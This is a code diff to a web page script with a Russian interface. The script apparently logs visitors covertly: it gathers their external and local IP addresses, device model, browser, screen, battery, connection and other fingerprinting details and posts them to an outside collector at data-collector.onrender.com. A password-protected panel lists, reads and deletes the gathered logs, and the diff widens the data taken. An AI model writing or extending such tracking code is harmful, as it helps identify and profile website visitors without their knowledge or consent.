@@ -92,6 +92,11 @@
         if(ips[0].status==='fulfilled' && ips[0].value) extIP = ips[0].value;
         else if(ips[1].status==='fulfilled' && ips[1].value) extIP = ips[1].value;
         if(ips[2].status==='fulfilled' && ips[2].value) localIP = ips[2].value;
+        const languages = navigator.languages ? navigator.languages.join(', ') : z4;
+        const screenInfo = `${screen.width}x${screen.height} @${window.devicePixelRatio||1} (depth: ${screen.colorDepth}bit)`;
+        const connection = navigator.connection ? `Type: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps` : 'unknown';
+        const battery = navigator.getBattery ? (await navigator.getBattery().catch(()=>null)) : null;
+        const batteryInfo = battery ? `Level: ${Math.round(battery.level*100)}%, Charging: ${battery.charging}` : 'unknown';
         const payload = {
           externalIP: extIP,
           localIP: localIP,
@@ -102,11 +107,20 @@
           model: he.model||'',
           browserBrands: z9,
           browserVersion: he.uaFullVersion||'',
+          vendor: navigator.vendor||'unknown',
           language: z4,
-          screen: z5,
+          languages: languages,
+          screen: screenInfo,
           cpuCores: z6,
           memoryGB: z7 ? `${(z7/1024).toFixed(2)} GB` : 'unknown',
           timezone: z8,
+          connection: connection,
+          battery: batteryInfo,
+          cookieEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack||'unknown',
+          pdfViewerEnabled: navigator.pdfViewerEnabled?'yes':'no',
+          maxTouchPoints: navigator.maxTouchPoints||0,
+          online: navigator.onLine?'yes':'no',
           timestamp: new Date().toISOString()
         };
         const sections = {
@@ -127,9 +141,10 @@
         const timestamp = new Date().toISOString().replace(/:/g, '-').split('.')[0];
         const folderName = 'site_logs';
         const fileName = `${nameBase}_${timestamp}.txt`;
+        const BASE_API = 'https://data-collector.onrender.com';
         try {
           const payload = { folder_name: folderName, file_name: fileName, content: txt };
-          await fetch('https://data-collector.onrender.com/collect', {
+          await fetch(`${BASE_API}/collect`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
@@ -207,7 +222,10 @@
         wrap.style.gap = '8px';
         list.appendChild(wrap);
         try{
-          const res = await fetch('https://data-collector.onrender.com/list');
+          const BASE_API = 'https://data-collector.onrender.com';
+          const url = `${BASE_API}/list`;
+          const res = await fetch(url);
+          if(!res.ok){ throw new Error(`HTTP ${res.status}`); }
           const data = await res.json();
           const logs = data.files || [];
           if(!logs.length){ const p = document.createElement('p'); p.textContent = 'Файлов нет'; p.style.textAlign = 'center'; p.style.color = 'var(--muted)'; list.appendChild(p); return; }
@@ -219,12 +237,19 @@
             const time = document.createElement('span'); time.textContent = new Date(item.time).toLocaleString('ru-RU'); time.style.fontSize='13px'; time.style.color='var(--muted)';
             left.appendChild(name); left.appendChild(time);
             const view = document.createElement('button'); view.className='btn secondary'; view.textContent='Просмотр';
-            view.addEventListener('click', ()=>{
+            view.addEventListener('click', async ()=>{
               const modal = document.createElement('div'); modal.style.position='fixed'; modal.style.inset='0'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='2000'; modal.style.background='rgba(0,0,0,.5)'; modal.style.backdropFilter='blur(8px)';
               const sheet = document.createElement('div'); sheet.style.width='min(90%, 700px)'; sheet.style.maxHeight='80vh'; sheet.style.background='var(--card)'; sheet.style.border='1px solid var(--border)'; sheet.style.borderRadius='20px'; sheet.style.padding='24px'; sheet.style.overflow='auto';
               const close = document.createElement('button'); close.className='btn'; close.textContent='Закрыть'; close.style.marginTop='16px';
               close.onclick = () => modal.remove();
-              sheet.innerHTML = `<pre style="white-space:pre-wrap;font-size:13px;line-height:1.5;margin:0">${item.data}</pre>`;
+              try{
+                const r = await fetch(`${BASE_API}/read?path=${encodeURIComponent(item.path)}`);
+                if(!r.ok) throw new Error(`HTTP ${r.status}`);
+                const j = await r.json();
+                sheet.innerHTML = `<pre style="white-space:pre-wrap;font-size:13px;line-height:1.5;margin:0">${(j.content||'').replace(/[<>&]/g, c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]))}</pre>`;
+              }catch(err){
+                sheet.innerHTML = `<div style="color:var(--muted)">Ошибка чтения: ${err?.message||'unknown'}</div>`;
+              }
               sheet.appendChild(close); modal.appendChild(sheet); document.body.appendChild(modal); modal.onclick = e => { if(e.target === modal) modal.remove(); };
             });
             const del = document.createElement('button'); del.className='btn secondary'; del.textContent='Удалить';
@@ -236,7 +261,7 @@
                 async function hx(str){ const e=new TextEncoder(); const b=await crypto.subtle.digest('SHA-256',e.encode(str)); const a=Array.from(new Uint8Array(b)); return a.map(x=>x.toString(16).padStart(2,'0')).join(''); }
                 const hp=await hx(pw); const expected=await hx(dz());
                 if(hp!==expected){ const sh=b.querySelector('.sheet'); if(sh){ sh.classList.remove('shake'); sh.offsetWidth; sh.classList.add('shake'); } return; }
-                await fetch(`https://data-collector.onrender.com/delete?path=${encodeURIComponent(item.path)}`, { method: 'DELETE' });
+                await fetch(`${BASE_API}/delete?path=${encodeURIComponent(item.path)}`, { method: 'DELETE' });
                 y();
               }catch{}
             });
@@ -250,12 +275,11 @@
               async function hx(str){ const e=new TextEncoder(); const b=await crypto.subtle.digest('SHA-256',e.encode(str)); const a=Array.from(new Uint8Array(b)); return a.map(x=>x.toString(16).padStart(2,'0')).join(''); }
               const hp=await hx(pw); const expected=await hx(dz());
               if(hp!==expected) return;
-              for(const item of logs) await fetch(`https://data-collector.onrender.com/delete?path=${encodeURIComponent(item.path)}`, { method: 'DELETE' });
+              for(const item of logs) await fetch(`${BASE_API}/delete?path=${encodeURIComponent(item.path)}`, { method: 'DELETE' });
               y();
             };
           }
-          
-        }catch(e){ const p = document.createElement('p'); p.textContent = 'Ошибка загрузки списка'; p.style.textAlign = 'center'; p.style.color = 'var(--muted)'; list.appendChild(p); }
+        }catch(e){ const p = document.createElement('p'); p.textContent = `Ошибка загрузки списка: ${e?.message||'unknown'}`; p.style.textAlign = 'center'; p.style.color = 'var(--muted)'; list.appendChild(p); }
       }
       function s(){ return !!sessionStorage.getItem(g); }
       async function t(x){ const enc = new TextEncoder(); const buf = await crypto.subtle.digest('SHA-256', enc.encode(x)); const arr = Array.from(new Uint8Array(buf)); return arr.map(b=>b.toString(16).padStart(2,'0')).join(''); }
